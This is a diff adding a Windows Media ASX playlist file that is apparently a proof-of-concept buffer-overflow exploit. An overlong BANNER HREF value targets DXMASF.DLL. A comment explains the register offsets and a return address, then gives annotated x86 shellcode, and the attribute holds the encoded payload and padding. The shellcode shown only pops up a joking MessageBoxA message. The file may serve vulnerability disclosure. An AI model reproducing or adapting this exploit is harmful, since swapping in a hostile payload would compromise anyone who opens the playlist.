@@ -1,0 +1,58 @@
+<ASX version="3.0">
+<!--
+- So the HREF attribute value of BANNER tag is to overflow soon.
+- The character before the last one should be '\' to avoid mangling
+the code earlier in the function. I don't know if this is mandatory
+though.
+- 4 characters forward from string offset 265 are loaded into EAX
+before RET.
+- 4 characters forward from string offset 269 are loaded into EBP
+before RET.
+- I start messing with RET's forward from 273th byte of the string.
+- I chose the return address to be 0x1FF0BB9A which is in DXMASF.DLL
+itself and is the same in both vulnerable versions I had access to.
+- The return address contains this code: "RET 4" (= C2 04 00).
+- The code allows to recurse in the stack to a usable pointer that
+points to the beginning of the string. No characters allowed after
+that point to avoid overwriting the address.
+- Execution begins at "C:\!A" (without parenthesis.) These characters
+form valid instructions so they don't do any harm.
+
+EB 32 			; jmp forward
+5F			; pop edi 		; got the message string address
+33 C0 			; xor eax,eax
+50 			; push eax 		; push 0
+57			; push edi		; push message string address
+
+83 EF 06		; sub edi, 6
+AA			; stosb
+83 C7 16		; add edi, 22
+AA			; stosb			; set terminator byte
+57 			; push edi 		; push caption string address
+83 C7 36		; add edi, 54
+AA			; stosb			; set terminator byte
+50 			; push eax 		; push 0
+FF 15 7C 12 F0 1F 	; call [1FF0127C] 	; call MessageBoxA
+
+B8 A8 FF F8 7F		; mov eax, 7FF8FFA8
+F7 D0			; not eax
+5F			; pop edi		
+5F			; pop edi		
+5F			; pop edi
+5F			; pop edi
+5E			; pop esi
+5B			; pop ebx
+
+8B EC			; mov ebp, esp		
+81 ED CC F7 FF FF	; sub ebp, -2100
+
+C9			; leave
+C2 0C xx		; ret 0xC
+E8 C9 FF FF FF 		; call backward
+db 'Drugs are baad...'
+db 'You should not use drugs. You knew that? Oh silly mee.'
+-->
+<BANNER HREF="C:\!Aë2_3ÀPWƒïªƒÇªWƒÇ6ªPÿ|ð¸¨ÿø÷Ð____^[‹ìíÌ÷ÿÿÉÂxèÉÿÿÿDrugs are baad...xYou should not use drugs. You knew that? Oh silly mee.xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=eax=ebpš»ðAAAAš»ðAAAAš»ðAAAAš»ðAAAAš»ðAAAAš»ðAAAAš»ðAAAAš»ðAAAAš»ðAAAAš»ðAAAAš»ðAAAAš»ðAAAAš»ðA\A"/>
+<ENTRY><REF HREF="C:\WINDOWS\Clock.avi"/></ENTRY>
+<ENTRY><REF HREF="C:\WINNT\Clock.avi"/></ENTRY>
+</ASX>
